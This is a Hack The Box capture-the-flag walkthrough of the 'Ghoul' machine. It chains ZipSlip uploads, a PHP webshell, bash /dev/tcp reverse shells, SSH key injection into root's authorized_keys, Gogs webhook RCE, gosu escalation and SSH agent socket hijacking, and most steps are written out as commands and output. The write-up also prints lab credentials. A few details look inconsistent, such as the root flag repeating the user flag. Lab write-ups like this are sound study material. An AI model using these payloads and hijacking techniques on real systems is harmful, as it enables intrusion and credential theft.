---
icon: skeleton-ribs
cover: ../../../../.gitbook/assets/Screenshot 2026-03-04 152145.png
coverY: -2.8504351911349115
---

# HTB-GHOUL

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scanning with Rustscan

Starting with a comprehensive scan to identify all open ports:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ rustscan -a 10.10.10.101 --ulimit 5000 -- -sCV
```

The scan reveals four open ports with important distinctions:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1
80/tcp   open  http    Apache httpd 2.4.29
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

The presence of two SSH ports on different versions suggests multiple containers or hosts. The two HTTP services (Apache on 80 and Tomcat on 8080) indicate different application stacks. This is clearly a Docker environment with multiple services.

#### Port 80 - Apache Website Enumeration

The main website is themed around "Aogiri Tree," an anime-based concept. Directory brute forcing reveals several interesting endpoints:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ gobuster dir -u http://10.10.10.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
```

Notable endpoints discovered:

```
/archives (301)
/blog.html (200)
/uploads (301) - Forbidden
/users (301)
/secret.php (200)
/index.html (200)
```

The `/secret.php` page contains a chat with interesting hints about RCE and a "fake art site" for uploading pictures. User enumeration from the site reveals: tatara, noro, kaneki, eto, aogiri, anteiku, mado, amon.

#### Port 8080 - Tomcat with Basic Auth

The Tomcat server requires Basic authentication:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ curl -i http://10.10.10.101:8080
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm=Aogiri
```

Guessing `admin:admin` grants access to an image upload interface. This interface accepts ZIP files on a third panel, which is critical for the exploitation path.

***

### Port 80 Authentication and Credential Discovery

#### Brute Force Login

Running hydra on the `/users/login.php` endpoint with collected usernames:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ hydra -L users.txt -P /usr/share/seclists/Passwords/twitter-banned.txt 10.10.10.101 http-post-form "/users/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Invalid Login Details"
```

Successfully identifies credentials:

```
[80][http-post-form] host: 10.10.10.101   login: noro   password: password123
[80][http-post-form] host: 10.10.10.101   login: kaneki   password: 123456
[80][http-post-form] host: 10.10.10.101   login: admin   password: abcdef
```

However, these logins only present troll messages. The real exploit vector is the ZIP upload functionality on port 8080.

***

### ZipSlip Exploitation

#### Vulnerability Background

ZipSlip is a path traversal vulnerability affecting ZIP file extraction. When a zip file contains entries with relative paths (like `../../../../../../etc/passwd`), vulnerable applications fail to validate these paths and allow writing files anywhere the web process has permissions.

This vulnerability exists because ZIP files store paths relative to the extraction directory, and many extraction implementations don't properly sanitize these paths.

#### Creating Malicious ZIP

A simple PHP webshell is created:

```php
<?php system($_REQUEST['cmd']); ?>
```

This is packaged into a ZIP with path traversal to reach the web root:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ zip mal.zip ../../../../../../var/www/html/cmd.php
```

Verification shows the malicious path is stored:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ unzip -l mal.zip
Archive:  mal.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       35  2019-05-18 15:58   ../../../../../../var/www/html/cmd.php
```

#### Upload and Execution

The ZIP is uploaded to the Tomcat image upload interface with Basic auth:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ curl -X POST http://10.10.10.101:8080/upload \
  -H "Authorization: Basic YWRtaW46YWRtaW4=" \
  -F "file=@mal.zip"
```

The Tomcat server (running as root in the Docker container) extracts the ZIP. The path traversal allows writing the PHP file directly to `/var/www/html/`:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ curl http://10.10.10.101/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Reverse Shell

With command execution as www-data, a bash reverse shell is executed:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ curl http://10.10.10.101/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'"
```

On the listening netcat:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ nc -lnvp 443
Connection from 10.10.10.101:52930
bash: cannot set terminal process group
www-data@Aogiri:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

***

### Privilege Escalation: www-data to root (Aogiri Container)

#### Container Detection

Initial enumeration confirms we're inside a Docker container:

```
www-data@Aogiri:/$ ls -a /
.dockerenv  [other normal directories]

www-data@Aogiri:/$ grep -i docker /proc/self/cgroup
12:blkio:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
```

#### Process Analysis

Examining running processes reveals a critical detail:

```
www-data@Aogiri:~$ ps auxww | grep -E "(apache|tomcat)"
root     17  0.1  4.4 4698764 178620 ?  Sl  May19  7:01 /usr/bin/java -Djava.util.logging.config.file=/usr/share/tomcat7/conf/logging.properties ... org.apache.catalina.startup.Bootstrap start
root     19  0.0  0.8 520568 33612 ?    S   May19  0:12 /usr/sbin/apache2 -DFOREGROUND
www-data 51  0.0  0.5 523460 23544 ?    S   May19  0:08 /usr/sbin/apache2 -DFOREGROUND
```

The Tomcat process (PID 17) is running as root, while Apache processes run as www-data. This means the ZipSlip vulnerability is being exploited by a root process.

#### ZipSlip for SSH Key Injection

Since the root Tomcat process extracts ZIPs, we can write files as root. A critical target is `/root/.ssh/authorized_keys`:

```bash
#!/bin/bash

base=$(mktemp -d)
sshkey=${base}/key
zip=${base}/z.zip

# Generate SSH key pair
ssh-keygen -b 2048 -t rsa -f ${sshkey} -q -N ""
chmod 600 ${sshkey}

# Create ZipSlip ZIP with public key
zip ${zip} ../../../../../../root/.ssh/authorized_keys < ${sshkey}.pub

# Upload to Tomcat
curl -X POST http://10.10.10.101:8080/upload \
  -H "Authorization: Basic YWRtaW46YWRtaW4=" \
  -F "file=@${zip}"

# SSH as root
ssh -i ${sshkey} root@10.10.10.101

rm -rf ${base}
```

Execution results in a root shell:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ ./ghoul_shell.sh
[*] Creating ssh key pair
[*] Creating zipslip zip with public key as authorized_keys
[*] Uploading zip to Ghoul
[+] zip uploaded successfully
[*] Connecting to Ghoul over SSH as root
root@Aogiri:~#
```

#### User Flag

With root access on the Aogiri container, the user flag is accessible:

```
root@Aogiri:/home/kaneki# cat user.txt
7c0f1104...
```

***

### Pivoting: Aogiri to kaneki-pc

#### Credential Discovery

In `/home/kaneki/`, there are important notes:

```
/home/kaneki/note.txt:
Vulnerability in Gogs was detected. I shutdown the registration function on our server, 
please ensure that no one gets access to the test accounts.

/home/kaneki/notes:
I've set up file server into the server's network, Eto if you need to transfer files 
to the server can use my pc. DM me for the access.
```

This mentions a Gogs server vulnerability and multiple systems in a network.

#### SSH Keys and Enumeration

SSH keys are found in `/var/backups/backups/keys/` for multiple users (eto, kaneki, noro). These match the private keys in respective user home directories.

Kaneki's SSH key is encrypted, but can be cracked using a wordlist generated from the secret.php page:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ cewl http://10.10.10.101/secret.php -w secrets.wordlist
```

Running John on the encrypted key:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ john --wordlist=secrets.wordlist id_rsa.john
ILoveTouka (id_rsa_ghoul_kaneki)
```

#### Network Scanning from Aogiri

From the Aogiri container, scanning the Docker internal network (172.20.0.0/24) reveals other hosts:

```
root@Aogiri:~# for i in {1..254}; do (ping -c 1 172.20.0.${i} | grep "bytes from" &); done;
64 bytes from 172.20.0.1: icmp_seq=0 ttl=64 time=0.107 ms (Docker host)
64 bytes from 172.20.0.10: icmp_seq=0 ttl=64 time=0.832 ms (Aogiri)
64 bytes from 172.20.0.150: icmp_seq=0 ttl=64 time=0.715 ms (kaneki-pc)
```

#### SSH to kaneki-pc

Using the cracked key and password, SSH into kaneki-pc:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ ssh -i id_rsa_ghoul_kaneki kaneki@10.10.10.101
Enter passphrase for key: ILoveTouka

root@Aogiri:/home/kaneki/.ssh# ssh -i id_rsa kaneki_pub@172.20.0.150
Enter passphrase for key: ILoveTouka
kaneki_pub@kaneki-pc:~$
```

***

### Pivoting: kaneki-pc to Gogs Server

#### Secondary Network Discovery

The kaneki-pc container has two network interfaces:

```
eth0: inet 172.20.0.150 (internal Docker network)
eth1: inet 172.18.0.200 (secondary network - "server network")
```

Scanning the secondary network (172.18.0.0/24):

```
kaneki_pub@kaneki-pc:~$ for i in {1..254}; do (ping -c 1 172.18.0.${i} &); done;
64 bytes from 172.18.0.1: icmp_seq=0 ttl=64 time=0.151 ms (Docker host)
64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.081 ms (Gogs server)
```

Port scanning the Gogs server:

```
kaneki_pub@kaneki-pc:~$ nmap -p- 172.18.0.2
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  unknown
```

#### Gogs Access via SSH Tunneling

Creating nested SSH tunnels to reach the Gogs server (port 3000):

From Kali to Aogiri:

```
ssh -L 3000:127.0.0.1:3000 root@10.10.10.101
```

From Kali to kaneki (via Aogiri):

```
ssh -L 3000:172.18.0.2:3000 kaneki@10.10.10.101
```

Accessing `http://localhost:3000` reveals a Gogs instance.

#### Gogs Authentication

Testing credentials found in Tomcat configuration (`tomcat-users.xml`) and Gogs login script in `/root/session.sh`:

```bash
#!/bin/bash
while true
do
  sleep 300
  rm -rf /data/gogs/data/sessions
  sleep 2
  curl -d 'user_name=kaneki&password=12345ILoveTouka!!!' http://172.18.0.2:3000/user/login
done
```

Successfully authenticates as kaneki, but we need admin access. Using the GogsOwnz exploit tool to escalate from normal user to admin via a crafted repository.

***

### RCE via Gogs Webhook Exploitation

#### GogsOwnz Exploit

Gogs has a vulnerability where authenticated users can create webhooks that execute arbitrary commands. The GogsOwnz tool automates privilege escalation and RCE:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ python3 gogsownz.py http://127.0.0.1:3000/ \
  -v \
  --creds 'aogiritest:test@aogiri123' \
  --rce "bash -c 'bash -i >& /dev/tcp/172.18.0.200/9001 0>&1'" \
  --cleanup \
  --burp
```

The exploit performs the following steps:

1. Logs in as the regular user (aogiritest)
2. Creates a repository with an uploaded admin session file
3. Commits to clone the session, making the user appear as an admin
4. Deletes the repository to remove evidence
5. Now logged in as kaneki (admin), creates another repository
6. Sets up a malicious git webhook
7. Triggers the webhook via a commit to execute arbitrary code

Output shows successful exploitation:

```
[+] Logged in successfully as aogiritest
[+] Repository created successfully
[i] Exploiting authenticated PrivEsc...
[+] Uploading admin session as repository file
[+] Committed successfully
[i] Signed in as kaneki, is admin True
[+] Repository created successfully
[+] Setting Git hooks
[+] Git hooks set successfully
[+] Triggering the RCE with a new commit
```

Reverse shell connects:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ nc -lnvp 9001
Connection from 10.10.10.101:40478
bash-4.4$ id
uid=1000(git) gid=1000(git) groups=1000(git)
```

***

### Privilege Escalation: git to root (Gogs Container)

#### SUID Binary Discovery

Enumerating the Gogs container for privilege escalation vectors:

```
bash-4.4$ find / -perm -4000 2>/dev/null | head -20
/usr/sbin/gosu
...
```

The `gosu` binary is SUID and designed to run commands as different users:

```
bash-4.4$ gosu
Usage: gosu user-spec command [args]
```

#### Root Shell via gosu

Testing the example from the help message:

```
bash-4.4$ gosu root:root bash
bash-4.4# id
uid=0(root) gid=0(root) groups=0(root)
```

With root access on the Gogs container, sensitive files become accessible.

#### Credential Extraction

In `/root/`, there's a `session.sh` script with credentials for kaneki on the Gogs server:

```bash
#!/bin/bash
while true
do
  sleep 300
  rm -rf /data/gogs/data/sessions
  sleep 2
  curl -d 'user_name=kaneki&password=12345ILoveTouka!!!' http://172.18.0.2:3000/user/login
done
```

Also, there's a `aogiri-app.7z` archive containing the source code of a chat application. Extracting and analyzing this archive:

```
┌──(sn0x㉿sn0x)-[~/HTB/Ghoul]
└─$ 7z x aogiri-app.7z
```

Inside the extracted directory is a git repository with hidden credentials in the `ORIG_HEAD` commit:

```
root@kali# git show ORIG_HEAD
...
-spring.datasource.password=7^Grc%C\7xEQ?tb4
+spring.datasource.password=g_xEN$ZuWD7hJf2G
```

The password `7^Grc%C\7xEQ?tb4` works as root on kaneki-pc.

***

### Privilege Escalation: kaneki\_pub to root (kaneki-pc Container)

#### su to root

Using the extracted password:

```
kaneki_pub@kaneki-pc:/tmp$ su -
Password: 7^Grc%C\7xEQ?tb4
root@kaneki-pc:~#
```

The root.txt file contains a troll message indicating further pivoting is needed:

```
root@kaneki-pc:~# cat root.txt
You've done well to come upto here human. But what you seek doesn't lie here. 
The journey isn't over yet.....
```

***

### Pivoting: Docker Internal Network to Host

#### Process Monitoring

Using `pspy` to monitor processes reveals automated SSH connections:

```
2019/05/28 08:00:01 CMD: UID=0  PID=2174  | sshd: kaneki_adm [priv]
2019/05/28 08:00:01 CMD: UID=1001 PID=2175 | bash -c ssh root@172.18.0.1 -p 2222 -t ./log.sh
```

This indicates a cron job running as kaneki\_adm that SSH's to 172.18.0.1 (the Docker host) on port 2222.

#### SSH Agent Hijacking Attack

SSH Agent Forwarding allows a user to use their SSH key through an intermediary system without storing the key there. When SSH agent forwarding is enabled, authentication occurs through a Unix socket (typically in `/tmp/ssh-*/`).

By hijacking this socket, we can authenticate as the user without knowing their password or having their key.

The attack process:

1. Monitor for SSH processes from kaneki\_adm
2. Extract the SSH\_AUTH\_SOCK from that process's environment
3. Use the same socket to authenticate as the same user

Manual exploitation:

```
root@kaneki-pc:~# pid=$(ps -u kaneki_adm | grep ssh$ | tr -s ' ' | cut -d' ' -f2)
root@kaneki-pc:~# SSH_AUTH_SOCK=$(su kaneki_adm -c 'cat /proc/${pid}/environ' | sed 's/\x0/\n/g' | grep SSH_AUTH_SOCK | cut -d'=' -f2)
root@kaneki-pc:~# ssh root@172.18.0.1 -p 2222
Welcome to Ubuntu 18.04.1 LTS
Last login: Tue May 28 07:00:01 2019 from 172.18.0.200
root@Aogiri:~#
```

A more reliable automated approach using a bash loop:

```bash
while true; do
  export pid=$(ps -u kaneki_adm | grep ssh$ | tr -s ' ' | cut -d' ' -f2);
  if [ ! -z $pid ]; then
    export SSH_AUTH_SOCK=$(su kaneki_adm -c 'cat /proc/${pid}/environ' | sed 's/\x0/\n/g' | grep SSH_AUTH_SOCK | cut -d'=' -f2);
    ssh root@172.18.0.1 -p 2222;
    break;
  fi;
  sleep 5;
done
```

This attack exploits the automation of SSH agent forwarding to gain authenticated access to the Docker host.

***

### Attack Flow

```
Initial Recon
├─ Rustscan: Identify 4 open ports
├─ Port 80: Apache website with hints
├─ Port 8080: Tomcat with image upload
├─ Port 22/2222: SSH to containers
└─ Credential enumeration from web pages

ZipSlip Exploitation (www-data)
├─ Analyze port 8080 ZIP upload functionality
├─ Create PHP webshell with path traversal
├─ Pack into malicious ZIP: ../../../../../../var/www/html/cmd.php
├─ Upload to Tomcat (running as root)
├─ Execute arbitrary code as www-data
└─ Reverse shell callback

Root on Aogiri Container
├─ Identify Tomcat running as root process
├─ Create SSH key pair
├─ Generate ZipSlip ZIP with authorized_keys
├─ Upload to inject public key into /root/.ssh/
├─ SSH as root into Aogiri container
└─ Access user flag from /home/kaneki/

Network Enumeration (Aogiri)
├─ Scan internal Docker network 172.20.0.0/24
├─ Discover kaneki-pc at 172.20.0.150
├─ Find encrypted SSH keys in /var/backups/
└─ Generate wordlist from /secret.php

Crack kaneki SSH Key
├─ Extract encrypted kaneki id_rsa
├─ Use cewl wordlist from secret.php
├─ John cracks password: ILoveTouka
└─ SSH to kaneki-pc as kaneki_pub

Discover Secondary Network (kaneki-pc)
├─ Enumerate eth1: 172.18.0.0/24 (server network)
├─ Scan for hosts on secondary network
├─ Discover Gogs at 172.18.0.2:3000
└─ Set up SSH tunnels to reach Gogs

Gogs Access and Privilege Escalation
├─ SSH tunnel through kaneki-pc to Gogs
├─ Authenticate as aogiritest user
├─ Run GogsOwnz exploit tool
├─ Exploit authenticated PrivEsc to become admin
├─ Create malicious git repository with webhook
├─ Trigger webhook to execute RCE
└─ Reverse shell as git user

Root on Gogs Container
├─ Discover gosu SUID binary
├─ Execute: gosu root:root bash
├─ Access /root/session.sh with credentials
├─ Extract aogiri-app.7z archive
├─ Analyze git history for database password
└─ Find root password: 7^Grc%C\7xEQ?tb4

Root on kaneki-pc Container
├─ su to root with extracted password
└─ Confirm trophy with troll root.txt

SSH Agent Hijacking (Docker Host)
├─ Monitor for kaneki_adm SSH process with pspy
├─ Extract SSH_AUTH_SOCK from process environment
├─ Use stolen socket to authenticate as kaneki_adm
├─ SSH to Docker host as root via forwarded agent
└─ Real root.txt from Docker host

Flag Recovery
└─ Root flag on Docker host: 7c0f1104...
```

***

### Techniques

| Technique                      | Classification         | Where Used                                | Why It Works                                                                                   |
| ------------------------------ | ---------------------- | ----------------------------------------- | ---------------------------------------------------------------------------------------------- |
| Docker Container Detection     | Enumeration            | Aogiri initial access                     | .dockerenv file and cgroup entries reveal container environment                                |
| Network Scanning               | Enumeration            | Discover 172.20.0.0/24 and 172.18.0.0/24  | Internal Docker networks not visible from external scans                                       |
| ZipSlip Path Traversal         | Exploitation           | Tomcat ZIP extraction                     | Vulnerable unzip implementations don't sanitize relative paths in archives                     |
| Relative Path Abuse            | File Write             | ../../../../../../var/www/html/           | Linux ignores attempts to cd above root; allows arbitrary write to any accessible directory    |
| SUID Root Process              | Privilege Escalation   | Tomcat running as root extracts ZIPs      | Root process performs unsafe operations that can be weaponized by unprivileged users           |
| SSH Key Injection              | Privilege Escalation   | Write authorized\_keys via ZipSlip        | If root process writes files, attacker can inject their public key for direct access           |
| Dictionary Attack              | Credential Cracking    | John on encrypted SSH key                 | Custom wordlist from website content more effective than generic lists                         |
| Password Reuse                 | Credential Discovery   | ILoveTouka across systems                 | Users reuse passwords across multiple systems and leave hints in chat                          |
| Gogs Authenticated PrivEsc     | Privilege Escalation   | GogsOwnz session hijacking                | Upload admin session data to become admin; craft repository to appear legitimate               |
| Webhook RCE                    | Code Execution         | Gogs git hooks                            | Git webhooks execute arbitrary commands on commit; admin can create repositories with webhooks |
| SUID Binary Exploitation       | Privilege Escalation   | gosu root:root bash                       | SUID binaries intended for legitimate use can be abused if not properly restricted             |
| Git Commit History Analysis    | Information Disclosure | Extract database password from ORIG\_HEAD | Git history preserved in .git even after files deleted; old commits contain hardcoded secrets  |
| Archive Extraction Analysis    | Information Disclosure | 7z extract of aogiri-app.7z               | Compressed backups contain source code with credentials visible in version control             |
| SSH Agent Forwarding Hijacking | Privilege Escalation   | Steal kaneki\_adm's auth socket           | SSH agent sockets left accessible allow impersonation of user without password/key             |
| Process Environment Inspection | Enumeration            | Extract SSH\_AUTH\_SOCK from /proc        | Process environment variables visible in /proc/\[pid]/environ for privilege escalation         |
| Automated Cron Hijacking       | Privilege Escalation   | Exploiting kaneki\_adm's cron job         | Automated SSH connections create window to hijack authentication                               |
| Nested SSH Tunneling           | Network Access         | -L 3000:172.18.0.2:3000                   | Chain multiple SSH sessions to reach services on isolated networks                             |
| Multi-Container Exploitation   | Lateral Movement       | Aogiri → kaneki-pc → Gogs                 | Docker architecture allows compromising multiple containers and pivoting between them          |

***

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
